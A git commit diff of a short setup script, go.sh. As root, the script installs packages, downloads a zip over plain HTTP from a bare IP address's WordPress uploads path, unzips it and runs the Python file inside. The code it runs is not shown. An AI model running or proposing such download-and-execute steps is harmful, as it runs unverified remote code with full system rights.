9ead9f931bfb0b88cf6b942de7103a98f00f597d
xiutai <101174238+xiutai@users.noreply.github.com>
2022-12-04 23:26:35 +0800

    Update go.sh

--- go.sh
+++ go.sh
@@ -1,6 +1,8 @@
 apt update
-apt install tmux python3-pip zip -y
+apt install python3-pip zip -y
 pip install requests
+mkdir /root/spa
+cd /root/spa
 wget http://20.187.190.201:8080/wp-content/uploads/2022/12/spa.zip
 unzip spa.zip
 python3 spa.py
